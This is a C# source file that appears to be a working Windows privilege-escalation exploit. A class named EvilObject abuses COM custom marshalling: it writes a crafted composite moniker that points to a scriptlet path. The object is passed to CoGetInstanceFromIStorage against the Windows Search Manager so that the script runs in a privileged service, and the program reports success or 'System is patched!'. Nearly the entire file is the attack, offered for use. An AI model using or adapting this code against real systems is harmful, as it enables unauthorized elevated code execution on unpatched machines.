using System;
using System.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Diagnostics;

using System.Threading;

using ComTypes = System.Runtime.InteropServices.ComTypes;
using System.Runtime.InteropServices;


//namespace immunity
//{
    public enum CLSCTX
    {
	CLSCTX_INPROC_SERVER = 1,
	CLSCTX_INPROC_HANDLER,
	CLSCTX_LOCAL_SERVER = 4,
	CLSCTX_INPROC_SERVER16 = 8,
	CLSCTX_REMOTE_SERVER = 16,
	CLSCTX_INPROC_HANDLER16 = 32,
	CLSCTX_RESERVED1 = 64,
	CLSCTX_RESERVED2 = 128,
	CLSCTX_RESERVED3 = 256,
	CLSCTX_RESERVED4 = 512,
	CLSCTX_NO_CODE_DOWNLOAD = 1024,
	CLSCTX_RESERVED5 = 2048,
	CLSCTX_NO_CUSTOM_MARSHAL = 4096,
	CLSCTX_ENABLE_CODE_DOWNLOAD = 8192,
	CLSCTX_NO_FAILURE_LOG = 16384,
	CLSCTX_DISABLE_AAA = 32768,
	CLSCTX_ENABLE_AAA = 65536,
	CLSCTX_FROM_DEFAULT_CONTEXT = 131072
    }
    [StructLayout(LayoutKind.Sequential, Pack = 8)]
    public struct ImmLARGE_INTEGER
    {
	public long QuadPart;
    }
    
    public struct ImmULARGE_INTEGER
    {
	public ulong QuadPart;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct ImmFILETIME
    {
	public uint dwLowDateTime;
	public uint dwHighDateTime;
    }
    
    [Guid("0000000D-0000-0000-C000-000000000046")]
    [InterfaceType(1)]
    [ComImport]
    public interface ImmIEnumSTATSTG
    {
	[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
	int Next( [In] uint celt, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 0)] [Out] ImmSTATSTG[] rgelt,  out uint pceltFetched);

	[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
	int Skip( [In] uint celt);

	[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
	int Reset();

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Clone([MarshalAs(UnmanagedType.Interface)] out ImmIEnumSTATSTG ppEnum);
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 8)]
    public struct ImmSTATSTG
    {
	[MarshalAs(UnmanagedType.LPWStr)]
	public string pwcsName;

	public uint type;

	public ImmULARGE_INTEGER cbSize;

	public ImmFILETIME mtime;

	public ImmFILETIME ctime;

	public ImmFILETIME atime;

	public uint grfMode;

	public uint grfLocksSupported;

	public Guid clsid;

	public uint grfStateBits;

	public uint reserved;
    }
    
    [Guid("0C733A30-2A1C-11CE-ADE5-00AA0044773D")]
    [InterfaceType(1)]
    [ComImport]
    public interface ImmISequentialStream
    {
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Read([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [Out] byte[] pv, [In] uint cb,  out uint pcbRead);
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Write([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [In] byte[] pv, [In] uint cb,  out uint pcbWritten);
    }
    
    [Guid("0000000C-0000-0000-C000-000000000046")]
    [InterfaceType(1)]
    [ComImport]
    public interface ImmIStream : ImmISequentialStream
    {
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Read([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [Out] byte[] pv, [In] uint cb, out uint pcbRead);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Write([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] [In] byte[] pv, [In] uint cb,  out uint pcbWritten);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Seek( [In] ImmLARGE_INTEGER dlibMove,  [In] uint dwOrigin,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] plibNewPosition);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void SetSize([In] ImmULARGE_INTEGER libNewSize);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void CopyTo([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm,  [In] ImmULARGE_INTEGER cb,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] pcbRead,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] pcbWritten);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Commit( [In] uint grfCommitFlags);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Revert();

	[MethodImpl(MethodImplOptions.InternalCall)]
	void LockRegion( [In] ImmULARGE_INTEGER libOffset,  [In] ImmULARGE_INTEGER cb, [In] uint dwLockType);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void UnlockRegion( [In] ImmULARGE_INTEGER libOffset, [In] ImmULARGE_INTEGER cb, [In] uint dwLockType);
        
	[MethodImpl(MethodImplOptions.InternalCall)]
	void Stat( [MarshalAs(UnmanagedType.LPArray)] [Out] ImmSTATSTG[] pstatstg, [In] uint grfStatFlag);

	[MethodImpl(MethodImplOptions.InternalCall)]
	void Clone([MarshalAs(UnmanagedType.Interface)] out ImmIStream ppstm);
    }

    [Guid("00000003-0000-0000-C000-000000000046")]
	[InterfaceType(1)]
	[ComConversionLoss]
	[ComImport]
	public interface ImmIMarshal
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetUnmarshalClass( [In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS, out Guid pCid);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetMarshalSizeMax([In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS, out uint pSize);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void MarshalInterface([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm, [In] ref Guid riid, [In] IntPtr pv, [In] uint dwDestContext, [In] IntPtr pvDestContext, [In] uint MSHLFLAGS);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void UnmarshalInterface([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm, [In] ref Guid riid, out IntPtr ppv);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void ReleaseMarshalData([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void DisconnectObject([In] uint dwReserved);
	}

	[InterfaceType(1)]
	[ComConversionLoss]
	[Guid("0000000B-0000-0000-C000-000000000046")]
	[ComImport]
	public interface ImmIStorage
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		void CreateStream([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [In] uint grfMode,  [In] uint reserved1, [In] uint reserved2, [MarshalAs(UnmanagedType.Interface)] out ImmIStream ppstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void OpenStream([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [In] IntPtr reserved1, [In] uint grfMode, [In] uint reserved2, [MarshalAs(UnmanagedType.Interface)] out ImmIStream ppstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void CreateStorage([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [In] uint grfMode,  [In] uint reserved1, [In] uint reserved2, [MarshalAs(UnmanagedType.Interface)] out ImmIStorage ppstg);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void OpenStorage([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [MarshalAs(UnmanagedType.Interface)] [In] ImmIStorage pstgPriority, [In] uint grfMode, [In] IntPtr snbExclude, [In] uint reserved, [MarshalAs(UnmanagedType.Interface)] out ImmIStorage ppstg);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void CopyTo([In] uint ciidExclude, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 0)] [In] Guid[] rgiidExclude, [In] IntPtr snbExclude, [MarshalAs(UnmanagedType.Interface)] [In] ImmIStorage pstgDest);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void MoveElementTo([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName, [MarshalAs(UnmanagedType.Interface)] [In] ImmIStorage pstgDest, [MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsNewName, [In] uint grfFlags);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Commit([In] uint grfCommitFlags);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Revert();

		[MethodImpl(MethodImplOptions.InternalCall)]
		void EnumElements( [In] uint reserved1, [In] IntPtr reserved2, [In] uint reserved3, [MarshalAs(UnmanagedType.Interface)] out ImmIEnumSTATSTG ppEnum);
		[MethodImpl(MethodImplOptions.InternalCall)]
		void DestroyElement([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void RenameElement([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsOldName, [MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsNewName);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void SetElementTimes([MarshalAs(UnmanagedType.LPWStr)] [In] string pwcsName,  [MarshalAs(UnmanagedType.LPArray)] [In] ImmFILETIME[] pctime, [MarshalAs(UnmanagedType.LPArray)] [In] ImmFILETIME[] patime, [MarshalAs(UnmanagedType.LPArray)] [In] ImmFILETIME[] pmtime);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void SetClass([In] ref Guid clsid);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void SetStateBits([In] uint grfStateBits, [In] uint grfMask);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Stat( [MarshalAs(UnmanagedType.LPArray)] [Out] ImmSTATSTG[] pstatstg, [In] uint grfStatFlag);
	}

	[InterfaceType(1)]
	[Guid("0000010C-0000-0000-C000-000000000046")]
	[ComImport]
	public interface ImmIPersist
	{

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int GetClassID(out Guid pClassID);
	}


	[Guid("00000109-0000-0000-C000-000000000046")]
	[InterfaceType(1)]
	[ComImport]
	public interface ImmIPersistStream : ImmIPersist
	{

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int GetClassID(out Guid pClassID);


		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int IsDirty();

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Load([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Save([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm, [In] int fClearDirty);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetSizeMax([MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] pcbSize);
	}

    [InterfaceType(1)]
	[Guid("00000102-0000-0000-C000-000000000046")]
	[ComImport]
	public interface ImmIEnumMoniker
	{
		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int Next( [In] uint celt, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.Interface, SizeParamIndex = 0)] [Out] ImmIMoniker[] rgelt,  out uint pceltFetched);

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int Skip( [In] uint celt);

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int Reset();

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Clone([MarshalAs(UnmanagedType.Interface)] out ImmIEnumMoniker ppEnum);
	}
    	
	[InterfaceType(1)]
	[Guid("0000000F-0000-0000-C000-000000000046")]
	[ComImport]
	public interface ImmIMoniker : ImmIPersistStream
	{
		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int GetClassID(out Guid pClassID);

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int IsDirty();

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Load([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Save([MarshalAs(UnmanagedType.Interface)] [In] ImmIStream pstm, [In] int fClearDirty);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetSizeMax([MarshalAs(UnmanagedType.LPArray)] [Out] ImmULARGE_INTEGER[] pcbSize);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void BindToObject([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkToLeft,  [In] ref Guid riidResult, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void BindToStorage([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkToLeft, [ComAliasName("Microsoft.VisualStudio.OLE.Interop.REFIID")] [In] ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvObj);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Reduce([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [In] uint dwReduceHowFar, [MarshalAs(UnmanagedType.Interface)] [In] [Out] ref ImmIMoniker ppmkToLeft, [MarshalAs(UnmanagedType.Interface)] out ImmIMoniker ppmkReduced);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void ComposeWith([MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkRight, [In] int fOnlyIfNotGeneric, [MarshalAs(UnmanagedType.Interface)] out ImmIMoniker ppmkComposite);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Enum( [In] int fForward, [MarshalAs(UnmanagedType.Interface)] out ImmIEnumMoniker ppenumMoniker);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void IsEqual([MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkOtherMoniker);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Hash( out uint pdwHash);

		[MethodImpl(MethodImplOptions.PreserveSig | MethodImplOptions.InternalCall)]
		int IsRunning([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkToLeft, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkNewlyRunning);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetTimeOfLastChange([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkToLeft,  [MarshalAs(UnmanagedType.LPArray)] [Out] ImmFILETIME[] pFileTime);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void Inverse([MarshalAs(UnmanagedType.Interface)] out ImmIMoniker ppmk);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void CommonPrefixWith([MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkOther, [MarshalAs(UnmanagedType.Interface)] out ImmIMoniker ppmkPrefix);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void RelativePathTo([MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkOther, [MarshalAs(UnmanagedType.Interface)] out ImmIMoniker ppmkRelPath);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void GetDisplayName([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkToLeft,  [MarshalAs(UnmanagedType.LPWStr)] out string ppszDisplayName);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void ParseDisplayName([MarshalAs(UnmanagedType.Interface)] [In] ComTypes.IBindCtx pbc, [MarshalAs(UnmanagedType.Interface)] [In] ImmIMoniker pmkToLeft, [ComAliasName("Microsoft.VisualStudio.OLE.Interop.LPOLESTR")] [MarshalAs(UnmanagedType.LPWStr)] [In] string pszDisplayName,  out uint pchEaten, [MarshalAs(UnmanagedType.Interface)] out ImmIMoniker ppmkOut);

		[MethodImpl(MethodImplOptions.InternalCall)]
		void IsSystemMoniker( out uint pdwMksys);
	}



    public enum StgmConstants { 
	READ = 0x00000000,
	WRITE = 0x00000001,
	READWRITE = 0x00000002,
	// Sharing
	SHARE_EXCLUSIVE = 0x00000010,
	SHARE_DENY_WRITE = 0x00000020,
	SHARE_DENY_READ = 0x00000030,
	SHARE_DENY_NONE = 0x00000040,
	PRIORITY = 0x00040000,

	// Creation
	FAILIFTHERE = 0x00000000,
	CREATE = 0x00001000,
	CONVERT = 0x00020000,

	// Transactioning
	DIRECT = 0x00000000,
	TRANSACTED = 0x00010000,

	// Transactioning Performance
	NOSCRATCH = 0x00100000,
	NOSNAPSHOT = 0x00200000,

	// Direct SWMR and Simple
	SIMPLE = 0x08000000,
	DIRECT_SWMR = 0x00400000,

	// Delete on release
	DELETEONRELEASE = 0x04000000,
    };
    
    public class ImmComTypes{
	[DllImport("ole32.dll")]
	public static extern int CreateGenericComposite(ImmIMoniker pmkFirst,
							ImmIMoniker pmkRest,
							out ImmIMoniker ppmkComposite);

	[DllImport("ole32.dll")]
	public static extern int CreateBindCtx(uint reserved, out ComTypes.IBindCtx ppbc);
	[DllImport("ole32.dll")]
	public static extern int CreateFileMoniker([MarshalAs(UnmanagedType.LPWStr)] string lpszPathName, out ImmIMoniker ppmk);

	[DllImport("ole32.dll", EntryPoint = "CoCreateInstance", CallingConvention = CallingConvention.StdCall)]
	public static extern UInt32 CoCreateInstance([In, MarshalAs(UnmanagedType.LPStruct)] Guid rclsid,
					      IntPtr pUnkOuter,
					      UInt32 dwClsContext,
					      [In, MarshalAs(UnmanagedType.LPStruct)] Guid riid,
					      [MarshalAs(UnmanagedType.IUnknown)] out object rReturnedComObject);

	[DllImport("OLE32.DLL", ExactSpelling = true, PreserveSig = false)]
	public  static extern void OleSaveToStream(ImmIPersistStream pPStm,
						   ImmIStream pStm);
	
    }
    [ComConversionLoss]
    [Guid("00000000-0000-0000-C000-000000000046")]
    public class EvilObject: ImmIStorage, ImmIMarshal {

	
	public ImmIStorage storage;
	public Guid qc_mi_guid;
	public Guid composite_moniker_guid;
	public Guid new_moniker_guid;
	public Guid iunknown_guid;
	public Guid doc_guid;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string GetCurrentMethod (){
	    StackTrace st = new StackTrace ();
	    StackFrame sf = st.GetFrame (1);
	    return sf.GetMethod().Name;
	}

	
	public EvilObject(ImmIStorage arg_storage, Guid arg_doc_guid){
	    storage = arg_storage;
	    qc_mi_guid = new Guid("ECABAFCB-7F19-11D2-978E-0000F8757E2A");
	    composite_moniker_guid = new Guid("00000309-0000-0000-C000-000000000046");
	    new_moniker_guid = new Guid("ECABAFC6-7F19-11D2-978E-0000F8757E2A");
	    iunknown_guid = new Guid("00000000-0000-0000-C000-000000000046");
	    doc_guid = arg_doc_guid;
	}
	public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out ImmIStream ppstm){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
	}
	public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out ImmIStream ppstm){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
	}
	public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out ImmIStorage ppstg){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
	}
	public void OpenStorage(string pwcsName, ImmIStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out ImmIStorage ppstg){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
	}
	public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, ImmIStorage pstgDest){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
	}
	public void MoveElementTo(string pwcsName, ImmIStorage pstgDest, string pwcsNewName, uint grfFlags){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
	}
	public void Commit(uint grfCommitFlags){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.Commit(grfCommitFlags);
	}
	public void Revert(){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out ImmIEnumSTATSTG ppEnum){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
	}
	public void DestroyElement(string pwcsName){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    storage.DestroyElement(pwcsName);
	}
	public void RenameElement(string pwcsOldName, string pwcsNewName){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void SetElementTimes(string pwcsName, ImmFILETIME[] pctime, ImmFILETIME[] patime, ImmFILETIME[] pmtime){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void SetClass(ref Guid clsid){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void SetStateBits(uint grfStateBits, uint grfMask){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void Stat(ImmSTATSTG[] pstatstg, uint grfStatFlag){
	    Console.WriteLine(">> " + GetCurrentMethod());

	    storage.Stat(pstatstg, grfStatFlag);
	    pstatstg[0].pwcsName = doc_guid.ToString();

	}
	
	public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint mshlflags, out Guid pCid){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    // "QC Marshal Interceptor Class" GUID
	    pCid = qc_mi_guid;
	}
	public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint mshlflags, out uint pSize){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    pSize = 1024;
	}
	public void MarshalInterface(ImmIStream pStm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint mshlflags){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    uint count_written;
            
	    pStm.Write(new byte[]{0x00,0x00}, 2, out count_written);
	    Random random = new Random();
	    pStm.Write(new byte[]{(byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255)}, 10, out count_written);
            
	    pStm.Write(qc_mi_guid.ToByteArray(), 16, out count_written);
	    pStm.Write(new byte[]{(byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255), (byte)random.Next(0,255)}, 4, out count_written);
	    pStm.Write(composite_moniker_guid.ToByteArray(), 16, out count_written);
	    pStm.Write(new byte[]{0x02,0x00,0x00,0x00}, 4, out count_written);

	    ComTypes.IBindCtx bind_context;
	    ImmIMoniker file_moniker = null;
	    object new_moniker = null;

	    uint CLSCTX_ALL = (uint)CLSCTX.CLSCTX_INPROC_SERVER | (uint)CLSCTX.CLSCTX_INPROC_HANDLER | (uint)CLSCTX.CLSCTX_LOCAL_SERVER | (uint)CLSCTX.CLSCTX_REMOTE_SERVER;

	    ImmComTypes.CreateBindCtx(0, out bind_context);
	    string sct_path = "SCT_PATH";
	    
	    ImmComTypes.CreateFileMoniker(sct_path,
				       out file_moniker);
	    ImmComTypes.CoCreateInstance(new_moniker_guid,
				      IntPtr.Zero,
				      CLSCTX_ALL,
				      iunknown_guid,
				      out new_moniker);

	    ImmComTypes.OleSaveToStream((ImmIPersistStream)file_moniker, pStm);
	    ImmComTypes.OleSaveToStream((ImmIPersistStream)new_moniker, pStm);

	}
	public void UnmarshalInterface(ImmIStream pStm, ref Guid riid, out IntPtr ppv){
	    Console.WriteLine(">> " + GetCurrentMethod());
	    ppv = IntPtr.Zero;
	}
	public void ReleaseMarshalData(ImmIStream pStm){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
	public void DisconnectObject(uint dwReserved){
	    Console.WriteLine(">> " + GetCurrentMethod());
	}
    }
    public class Program
    {
	public enum RpcAuthnLevel
	{
	    Default =   0,
	    None    =   1,
	    Connect =   2,
	    Call    =   3,
	    Pkt     =   4,
	    PktIntegrity  =   5,
	    PktPrivacy   =   6
	};

	public enum RpcImpLevel
	{
	    Default    =   0,
	    Anonymous   =   1,
	    Identify   =   2,
	    Impersonate   =   3,
	    Delegate   =   4
	};

	public enum EoAuthnCap
	{
	    None = 0x00,
	    MutualAuth = 0x01,
	    StaticCloaking= 0x20,
	    DynamicCloaking= 0x40,
	    AnyAuthority= 0x80,
	    MakeFullSIC= 0x100,
	    Default= 0x800,
	    SecureRefs= 0x02,
	    AccessControl= 0x04,
	    AppID= 0x08,
	    Dynamic= 0x10,
	    RequireFullSIC= 0x200,
	    AutoImpersonate= 0x400,
	    NoCustomMarshal= 0x2000,
	    DisableAAA= 0x1000
	};
	
	[System.Runtime.InteropServices.DllImport("ole32.dll")]
	public static extern int CoInitializeSecurity( IntPtr pVoid,
						       int cAuthSvc,
						       IntPtr asAuthSvc,
						       IntPtr pReserved1,
						       RpcAuthnLevel level,
						       RpcImpLevel impers,
						       IntPtr pAuthList,
						       EoAuthnCap dwCapabilities,
						       IntPtr pReserved3 );

	[System.Runtime.InteropServices.DllImport("ole32.dll")]
	public static extern int CoInitialize(IntPtr reserved);
	
	[DllImport("ole32.dll", PreserveSig = false, ExactSpelling = true)]
        public static extern void CoGetInstanceFromIStorage(IntPtr pServerInfo,
							    ref Guid pclsid,
							    [MarshalAs(UnmanagedType.IUnknown)] object pUnkOuter,
							    CLSCTX dwClsCtx,
							    ImmIStorage pstg,
							    uint cmq,
							    [In, Out] IMM_MULTI_QI[] rgmqResults);
	
	// NN: see if you can replace this with StgCreateDocfileOnILockBytes
	[DllImport("ole32.dll")]
	static extern int StgCreateDocfile([MarshalAs(UnmanagedType.LPWStr)]
					   string pwcsName,
					   STGM grfMode,
					   uint reserved,
					   out ImmIStorage ppstgOpen);
	

	[DllImport ("ole32.dll")]
	public extern static int StgCreateDocfileOnILockBytes(IntPtr plkbyt,
							      STGM grfMode,
							      int reserved,
							      out ImmIStorage ppstgOpen);

	[DllImport ("ole32.dll")]
	public extern static int CreateILockBytesOnHGlobal(IntPtr hGlobal,
							   [MarshalAs(UnmanagedType.Bool)] bool fDeleteOnRelease,
							   IntPtr ppLkbyt);


	public enum STGM {
	    STGM_READ=0,
	    STGM_READWRITE=2,
	    STGM_SHARE_EXCLUSIVE=0x10,
	    STGM_CREATE=0x1000,
	};

	public static IntPtr NativeGuid(Guid guid){
	    IntPtr p_guid = Marshal.AllocCoTaskMem(16);
	    Marshal.Copy(guid.ToByteArray(), 0, p_guid, 16);
	    return p_guid;
	}

	[StructLayout(LayoutKind.Sequential)]
        public struct IMM_MULTI_QI
        {
            public IntPtr pIID;
            [MarshalAs(UnmanagedType.Interface)]
            public object pItf;
            public int hr;
        }

	
	[STAThread]
        public static void Main()
        {

	    CoInitialize(IntPtr.Zero);
	    CoInitializeSecurity(IntPtr.Zero,
				 -1,
				 IntPtr.Zero,
				 IntPtr.Zero,
				 RpcAuthnLevel.Default,
				 RpcImpLevel.Impersonate,
				 IntPtr.Zero,
				 EoAuthnCap.None,
				 IntPtr.Zero);
	    
	    
	    ImmIStorage doc_storage = null;
            
	    IntPtr p_lb = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
	    var iret = CreateILockBytesOnHGlobal(IntPtr.Zero, false, p_lb);
	    IntPtr lb = Marshal.ReadIntPtr(p_lb);

	    StgCreateDocfileOnILockBytes(lb, STGM.STGM_CREATE | STGM.STGM_READWRITE | STGM.STGM_SHARE_EXCLUSIVE, 0, out doc_storage);

	    Guid doc_guid = Guid.NewGuid();

	    ImmIStorage object_storage = new EvilObject(doc_storage, doc_guid);


	    Guid search_manager_guid = new Guid("7D096C5F-AC08-4F1F-BEB7-5C22C517CE39");
	    Program.IMM_MULTI_QI[] multi_qi = new IMM_MULTI_QI[1];

	    // IUnknown
	    multi_qi[0].pIID = NativeGuid(new Guid("00000000-0000-0000-C000-000000000046"));
	    multi_qi[0].pItf = null;
	    multi_qi[0].hr = 0;

	    try { 
		CoGetInstanceFromIStorage(IntPtr.Zero,
					  ref search_manager_guid,
					  null,
					  // CLSCTX.CLSCTX_LOCAL_SERVER,
					  CLSCTX.CLSCTX_INPROC_SERVER | CLSCTX.CLSCTX_INPROC_HANDLER | CLSCTX.CLSCTX_LOCAL_SERVER | CLSCTX.CLSCTX_REMOTE_SERVER,
					  object_storage,
					  1,
					  multi_qi);
	    } catch (InvalidCastException e){
		Console.WriteLine("Caught InvalidCastException - we did it!");
	    } catch (UnauthorizedAccessException e){
		Console.WriteLine("System is patched!");
	    }
	    

	    
        }
    }
//}
